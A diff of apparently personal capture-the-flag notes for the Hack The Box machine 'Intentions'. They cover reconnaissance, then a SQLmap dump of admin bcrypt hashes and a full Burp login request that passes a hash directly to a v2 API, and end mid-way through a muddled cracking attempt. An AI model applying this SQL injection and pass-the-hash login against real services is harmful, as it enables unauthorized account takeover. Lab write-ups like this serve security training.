@@ -213,17 +213,70 @@ _laurel:x:998:998::/var/log/laurel:/bin/false`
         - cat root.txt
 
 # Week 3 - Intentions (Hard)
+## Reco
 1. nmap -> open ports 22 & 80 (SSH,HTTP)
 2. Website -> login and register form
-3. SQLmap -> nothing found
-4. WFUZZ -> /admin /logout /css /js
-5. Nikto -> nikto -host http://10.10.11.220/ -C all -> nothing found
-6. Explore /FUZZ subsites -> redirect back to login or forbidden
-7. Register && Login -> Gallery & Feed - images, we can specify our favourite genres
+3. WFUZZ -> /admin /logout /css /js
+4. Nikto -> nikto -host http://10.10.11.220/ -C all
+    - nothing found
+5. Explore /FUZZ subsites
+    - http://10.10.11.220/js/admin.js
+        ![](https://hackmd.io/_uploads/HJQabgeF2.png)
+        - v2 API for admin section - PW is hashed using BCrypt
+            - uploaded images are also hashed (imagick)
+6. Register && Login -> Gallery & Feed - images, we can specify our favourite genres
         -> available genres: animals, architecture, food, nature
 8. Download images to test them for STEGO through: strings, binwalk, steghide, foremost, exiftool
         -> author names: ashlee w, dickens lin, jevgeni fil, kristin o karlsen etc...
         -> images are saved in path: /storage/<genre>/<name>
+    - nothing found
+## Weaponisation
+1. Obtaining login credentials
+    - SQLmap
+
+| admin | email | password |
+| -------- | -------- | -------- |
+| 1     | steve@intentions.htb | `$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa` |
+| 1     | greg@intentions.htb  | `$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m` |
+
+2. Testing hashes using Burpsuite
+    - listen while logging into the page
+    - send to repeater && modify request
+        - add: v2 API, Content-Type, credentials...like this: 
+        - `POST /api/v2/auth/login HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-XSRF-TOKEN: eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0=
+Connection: close
+Referer: http://intentions.htb/gallery
+Cookie: XSRF-TOKEN=eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkNzWHdLbEM2ZzZtOFBjcjlIUXQ0M1E9PSIsInZhbHVlIjoiVGxUYlVWc1FSTGtZZWdKZ2Y2QjhqNjNWZjVIZXhRd2tZVS9PR1dBcG0wOFI5RGI4TXhRb1paUmQ3T095MnNNdnFUd1IyeFNqcEFKLytyb0NnTm8veHNnaWFxT2VrcnZBcG9JbXl4Y1pndUF2cXRjMXd2aGVDYVUwbm8vWmVQWjYiLCJtYWMiOiI4MTgwYTk3ZmNhMjI3MzVkNDNlMGExNjUxNzIyNWY0MmJkZmNkOTRiYjI4NmViZTE5Y2U5MzEyOTg3YTNlN2UwIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODgzMzU1MjcsImV4cCI6MTY4ODM1NzEyNywibmJmIjoxNjg4MzM1NTI3LCJqdGkiOiJjeEdsQWZLRGtIT2xVcWVNIiwic3ViIjoiNDIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HG_JPZbeAyPgpwU2_sNv_i18r-BeaE9N0rkHTgfD6jk
+Content-Length: 104
+Content-Type: application/json
+{"email":"steve@intentions.htb",
+"hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}`
+    - response for steve: ![](https://hackmd.io/_uploads/Hkw_8elK2.png)
+    - response for greg : ![](https://hackmd.io/_uploads/SJXBvxxYh.png)
+    - successfully logged in as steve/greg, but no admin section...
+
+    
+3. Cracking PW hashed
+    - bcrypt is a one-way function -> we need a salt
+        - images could be hashed by the same salt like PWs 
+            - animals img names:
+                -   | # | full name | hash |
+                    | -------- | -------- | -------- |
+                    |1|ashlee-w-wv36v9TGNBw-unsplash.jpg|wv36v9TGNBw|
+                    |2|dickens-lin-Nr7QqJIP8Do-unsplash.jpg|Nr7QqJIP8Do|
+                    |3|dickens-lin-tycqN7-MY1s-unsplash.jpg|tycqN7-MY1s|
+                    |4|jevgeni-fil-rz2Nh0U8vws-unsplash.jpg|rz2Nh0U8vws|
+                    |5|kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg|u8aXoDEcDR0|
+                - all the hashes are 11 char long
+    
+
 
 
 
